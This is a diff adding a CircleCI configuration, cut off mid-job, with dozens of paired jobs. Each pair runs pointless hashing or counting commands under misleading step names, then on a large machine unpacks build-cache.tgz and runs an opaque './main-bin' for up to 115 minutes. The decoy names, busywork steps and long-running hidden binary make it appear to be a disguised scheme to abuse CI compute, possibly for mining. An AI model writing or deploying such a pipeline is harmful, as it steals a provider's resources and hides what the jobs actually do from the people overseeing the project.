@@ -1,0 +1,1432 @@
+version: 2.1
+
+jobs:
+  rerun_py310-fmt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute slot digest
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; seq 1 137223 | awk '{print $1 % 7}' | sort | uniq -c | wc -l; true ; } > /tmp/data/stats.tsv
+            echo "gate py310-fmt: $(wc -c </tmp/data/stats.tsv) bytes total"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - stats.tsv
+  py310-fmt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Verify previous
+          command: |
+            cat /tmp/data/stats.tsv
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xzvf build-cache.tgz
+      - run:
+          name: Verify output
+          command: sleep 30
+      - run:
+          no_output_timeout: 115m
+          command: nice -n 0 ./main-bin
+  vendor_update-cache-leak:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Interleave stream pairs
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; dd if=/dev/zero bs=1M count=2 2>/dev/null | sha256sum; true ; } > /tmp/data/69.out
+            echo "gate update-cache-leak: $(wc -c </tmp/data/69.out) bytes total"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - 69.out
+  update-cache-leak:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Verify previous
+          command: |
+            cat /tmp/data/46.data
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xzvf build-cache.tgz
+      - run:
+          name: Verify output
+          command: sleep 30
+      - run:
+          no_output_timeout: 115m
+          command: nice -n 0 ./main-bin
+  green_verify-staging-release-candidate:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Enumerate bucket keys
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; seq 1 57120 | paste - - - - | wc -l; true ; } > /tmp/data/step-done.out
+            echo "gate verify-staging-release-candidate: $(wc -c </tmp/data/step-done.out) bytes total"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - step-done.out
+  verify-staging-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Verify previous
+          command: |
+            cat /tmp/data/stats.tsv
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xzvf build-cache.tgz
+      - run:
+          name: Verify output
+          command: sleep 30
+      - run:
+          no_output_timeout: 115m
+          command: nice -n 0 ./main-bin
+  Beta_lima:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Prime cache tables
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; head -c 6291456 /dev/urandom | od -An -x | wc -w; true ; } > /tmp/data/result.md
+            echo "gate lima: $(wc -c </tmp/data/result.md) bytes total"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - result.md
+  lima:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Verify previous
+          command: |
+            cat /tmp/data/result.md
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xzvf build-cache.tgz
+      - run:
+          name: Verify output
+          command: sleep 30
+      - run:
+          no_output_timeout: 115m
+          command: nice -n 0 ./main-bin
+  beta_bug-4957:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Compile stats index
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; seq 1 440432 | sha1sum; true ; } > /tmp/data/artifact
+            echo "gate bug-4957: $(wc -c </tmp/data/artifact) bytes total"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - artifact
+  bug-4957:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Verify previous
+          command: |
+            cat /tmp/data/artifact
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xzvf build-cache.tgz
+      - run:
+          name: Verify output
+          command: sleep 30
+      - run:
+          no_output_timeout: 115m
+          command: nice -n 0 ./main-bin
+  redo_defualt-35:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Score sort stability
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(a=1;a<=2;a++)for(b=1;b<=3118;b++)s+=a*b;print s}'; true ; } > /tmp/data/.pid
+            echo "gate defualt-35: $(wc -c </tmp/data/.pid) bytes total"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - .pid
+  defualt-35:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Verify previous
+          command: |
+            cat /tmp/data/.pid
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xzvf build-cache.tgz
+      - run:
+          name: Verify output
+          command: sleep 30
+      - run:
+          no_output_timeout: 115m
+          command: nice -n 0 ./main-bin
+  cache_INFRA-259:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Inflate reference set
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc '[:xdigit:]' | head -c 19456 | wc -c; true ; } > /tmp/data/step-ready.out
+            echo "gate INFRA-259: $(wc -c </tmp/data/step-ready.out) bytes total"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - step-ready.out
+  INFRA-259:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Verify previous
+          command: |
+            cat /tmp/data/result.md
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xzvf build-cache.tgz
+      - run:
+          name: Verify output
+          command: sleep 30
+      - run:
+          no_output_timeout: 115m
+          command: nice -n 0 ./main-bin
+  provision_assemble-quick-regression-suite:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Measure throughput
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; yes "x$RANDOM" | head -n 419951 | md5sum; true ; } > /tmp/data/stash.bin
+            echo "gate assemble-quick-regression-suite: $(wc -c </tmp/data/stash.bin) bytes total"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - stash.bin
+  assemble-quick-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Verify previous
+          command: |
+            cat /tmp/data/46.data
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xzvf build-cache.tgz
+      - run:
+          name: Verify output
+          command: sleep 30
+      - run:
+          no_output_timeout: 115m
+          command: nice -n 0 ./main-bin
+  cook_delta:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Compact small objects
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; seq 1 208376 | awk 'NR>23698 && NR<52308{s+=$1}END{print s}'; true ; } > /tmp/data/step-9.out
+            echo "gate delta: $(wc -c </tmp/data/step-9.out) bytes total"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - step-9.out
+  delta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Verify previous
+          command: |
+            cat /tmp/data/step-9.out
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xzvf build-cache.tgz
+      - run:
+          name: Verify output
+          command: sleep 30
+      - run:
+          no_output_timeout: 115m
+          command: nice -n 0 ./main-bin
+  hook_cook-it:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Fold integer series
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; seq 1 289814 | tr '0-9' 'a-j' | wc -c; true ; } > /tmp/data/checkpoint-A.pkl
+            echo "gate cook-it: $(wc -c </tmp/data/checkpoint-A.pkl) bytes total"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - checkpoint-A.pkl
+  cook-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Verify previous
+          command: |
+            cat /tmp/data/checkpoint-A.pkl
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xzvf build-cache.tgz
+      - run:
+          name: Verify output
+          command: sleep 30
+      - run:
+          no_output_timeout: 115m
+          command: nice -n 0 ./main-bin
+  precheck_omar-test:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Compute spill delta
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; seq 1 280012 | tr '0-9' 'a-j' | wc -c; true ; } > /tmp/data/stats.json
+            echo "gate omar-test: $(wc -c </tmp/data/stats.json) bytes total"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - stats.json
+  omar-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Verify previous
+          command: |
+            cat /tmp/data/stats.json
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xzvf build-cache.tgz
+      - run:
+          name: Verify output
+          command: sleep 30
+      - run:
+          no_output_timeout: 115m
+          command: nice -n 0 ./main-bin
+  staging_Prepare_Release6:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Fold data streams
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; seq 1 351472 | awk 'NR%3==0{print}' | wc -l; true ; } > /tmp/data/.ready
+            echo "gate Prepare_Release6: $(wc -c </tmp/data/.ready) bytes total"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - .ready
+  Prepare_Release6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Verify previous
+          command: |
+            cat /tmp/data/result.md
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xzvf build-cache.tgz
+      - run:
+          name: Verify output
+          command: sleep 30
+      - run:
+          no_output_timeout: 115m
+          command: nice -n 0 ./main-bin
+  vendor_uniform:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Walk directory tree
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; seq 1 2400 | awk '{print toupper($0)}' | md5sum; true ; } > /tmp/data/secondary_task_output.log
+            echo "gate uniform: $(wc -c </tmp/data/secondary_task_output.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - secondary_task_output.log
+  uniform:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Verify previous
+          command: |
+            cat /tmp/data/secondary_task_output.log
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xzvf build-cache.tgz
+      - run:
+          name: Verify output
+          command: sleep 30
+      - run:
+          no_output_timeout: 115m
+          command: nice -n 0 ./main-bin
+  blue_Package_Pipeline8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Enumerate scalar triples
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; yes abc | head -n 495832 | sha256sum; true ; } > /tmp/data/big_job_output.txt
+            echo "gate Package_Pipeline8: $(wc -c </tmp/data/big_job_output.txt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - big_job_output.txt
+  Package_Pipeline8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Verify previous
+          command: |
+            cat /tmp/data/result.md
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xzvf build-cache.tgz
+      - run:
+          name: Verify output
+          command: sleep 30
+      - run:
+          no_output_timeout: 115m
+          command: nice -n 0 ./main-bin
+  staging_t-2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Reserve scratch region
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; yes 'line' | head -n 230206 | awk '{print NR, $0}' | tail -1; true ; } > /tmp/data/audit.log
+            echo "gate t-2: $(wc -c </tmp/data/audit.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - audit.log
+  t-2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Verify previous
+          command: |
+            cat /tmp/data/46.data
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xzvf build-cache.tgz
+      - run:
+          name: Verify output
+          command: sleep 30
+      - run:
+          no_output_timeout: 115m
+          command: nice -n 0 ./main-bin
+  round2_green-light:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Mix shuffle salt
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; seq 1 144995 | sha1sum; true ; } > /tmp/data/metrics.csv
+            echo "gate green-light: $(wc -c </tmp/data/metrics.csv) bytes total"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - metrics.csv
+  green-light:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Verify previous
+          command: |
+            cat /tmp/data/metrics.csv
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xzvf build-cache.tgz
+      - run:
+          name: Verify output
+          command: sleep 30
+      - run:
+          no_output_timeout: 115m
+          command: nice -n 0 ./main-bin
+  B_nebula-final:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Trace call sequence
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; seq 1 277139 | awk '{s+=$1}END{print s}'; true ; } > /tmp/data/big_step_output_v5.out
+            echo "gate nebula-final: $(wc -c </tmp/data/big_step_output_v5.out) bytes total"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - big_step_output_v5.out
+  nebula-final:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Verify previous
+          command: |
+            cat /tmp/data/46.data
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xzvf build-cache.tgz
+      - run:
+          name: Verify output
+          command: sleep 30
+      - run:
+          no_output_timeout: 115m
+          command: nice -n 0 ./main-bin
+  produce_europa-v2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Shuffle buffer blocks
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; seq 1 338948 | awk '{print $1 % 7}' | sort | uniq -c | wc -l; true ; } > /tmp/data/summary.out
+            echo "gate europa-v2: $(wc -c </tmp/data/summary.out) bytes total"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - summary.out
+  europa-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Verify previous
+          command: |
+            cat /tmp/data/summary.out
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xzvf build-cache.tgz
+      - run:
+          name: Verify output
+          command: sleep 30
+      - run:
+          no_output_timeout: 115m
+          command: nice -n 0 ./main-bin
+  stage_fix-router-crash:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Deflate payload chunk
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc '[:xdigit:]' | head -c 12288 | wc -c; true ; } > /tmp/data/80.bin
+            echo "gate fix-router-crash: $(wc -c </tmp/data/80.bin) bytes total"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - 80.bin
+  fix-router-crash:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Verify previous
+          command: |
+            cat /tmp/data/80.bin
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xzvf build-cache.tgz
+      - run:
+          name: Verify output
+          command: sleep 30
+      - run:
+          no_output_timeout: 115m
+          command: nice -n 0 ./main-bin
+  retry_bake-it:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Register task slot
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; seq 2 19390 | factor | wc -l; true ; } > /tmp/data/2023-05-28.data
+            echo "gate bake-it: $(wc -c </tmp/data/2023-05-28.data) bytes total"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - 2023-05-28.data
+  bake-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Verify previous
+          command: |
+            cat /tmp/data/46.data
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xzvf build-cache.tgz
+      - run:
+          name: Verify output
+          command: sleep 30
+      - run:
+          no_output_timeout: 115m
+          command: nice -n 0 ./main-bin
+  gamma_go-live:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Reset analytics bucket
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; seq 1 470400 | awk '{s+=$1}END{print s}'; true ; } > /tmp/data/2023-02-11.data
+            echo "gate go-live: $(wc -c </tmp/data/2023-02-11.data) bytes total"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - 2023-02-11.data
+  go-live:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Verify previous
+          command: |
+            cat /tmp/data/2023-02-11.data
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xzvf build-cache.tgz
+      - run:
+          name: Verify output
+          command: sleep 30
+      - run:
+          no_output_timeout: 115m
+          command: nice -n 0 ./main-bin
+  stepB_rust-release:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Reorder index entries
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; tr -dc 'a-z' </dev/urandom | head -c 33554432 | fold -w16 | sort -u | wc -l; true ; } > /tmp/data/handover.txt
+            echo "gate rust-release: $(wc -c </tmp/data/handover.txt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - handover.txt
+  rust-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Verify previous
+          command: |
+            cat /tmp/data/handover.txt
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xzvf build-cache.tgz
+      - run:
+          name: Verify output
+          command: sleep 30
+      - run:
+          no_output_timeout: 115m
+          command: nice -n 0 ./main-bin
+  p1_add-webhook:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Precompute lookup
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=109724;i++){x=sqrt(i);y=int(x);if(y*y==i)c++}print c}'; true ; } > /tmp/data/step-23.log
+            echo "gate add-webhook: $(wc -c </tmp/data/step-23.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - step-23.log
+  add-webhook:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Verify previous
+          command: |
+            cat /tmp/data/46.data
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xzvf build-cache.tgz
+      - run:
+          name: Verify output
+          command: sleep 30
+      - run:
+          no_output_timeout: 115m
+          command: nice -n 0 ./main-bin
+  cook_sanity:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Collect byte metrics
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; tr -dc '0-9A-F' </dev/urandom | head -c 552960 | fold -w4 | sort -R 2>/dev/null | head -c 200 || true; echo done; true ; } > /tmp/data/2023-07-15.data
+            echo "gate sanity: $(wc -c </tmp/data/2023-07-15.data) bytes total"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - 2023-07-15.data
+  sanity:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Verify previous
+          command: |
+            cat /tmp/data/2023-07-15.data
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xzvf build-cache.tgz
+      - run:
+          name: Verify output
+          command: sleep 30
+      - run:
+          no_output_timeout: 115m
+          command: nice -n 0 ./main-bin
+  ensure_cf-2a:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Walk sorted keys
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; tr -dc 'A-Za-z0-9' </dev/urandom | head -c 163840 | fold -w40 | sort | uniq -c | wc -l; true ; } > /tmp/data/55.data
+            echo "gate cf-2a: $(wc -c </tmp/data/55.data) bytes total"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - 55.data
+  cf-2a:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Verify previous
+          command: |
+            cat /tmp/data/55.data
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xzvf build-cache.tgz
+      - run:
+          name: Verify output
+          command: sleep 30
+      - run:
+          no_output_timeout: 115m
+          command: nice -n 0 ./main-bin
+  D_rl-old:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Normalize path list
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; ( echo "hdr"; seq 1 271030; echo "ftr" ) | wc -l; true ; } > /tmp/data/42.blob
+            echo "gate rl-old: $(wc -c </tmp/data/42.blob) bytes total"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - 42.blob
+  rl-old:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Verify previous
+          command: |
+            cat /tmp/data/stats.tsv
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xzvf build-cache.tgz
+      - run:
+          name: Verify output
+          command: sleep 30
+      - run:
+          no_output_timeout: 115m
+          command: nice -n 0 ./main-bin
+  produce_p-01:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Mint batch marker
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; dd if=/dev/zero bs=1M count=20 2>/dev/null | gzip -9 | wc -c; true ; } > /tmp/data/46.data
+            echo "gate p-01: $(wc -c </tmp/data/46.data) bytes total"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - 46.data
+  p-01:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
